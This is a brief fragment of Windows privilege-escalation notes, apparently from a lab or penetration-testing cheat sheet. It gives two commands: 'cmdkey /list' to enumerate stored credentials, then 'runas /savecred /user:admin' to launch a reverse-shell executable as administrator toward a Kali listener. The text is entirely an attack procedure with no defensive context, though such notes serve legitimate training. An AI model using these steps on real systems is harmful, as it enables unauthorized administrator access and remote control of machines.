
1. **List Saved Credentials:**
   ```plaintext
   cmdkey /list
   ```

2. **Run Reverse Shell Using Saved Credentials:**
   - Start a listener on Kali.
   - Execute the reverse shell:
     ```plaintext
     runas /savecred /user:admin C:\PrivEsc\reverse.exe
     ```
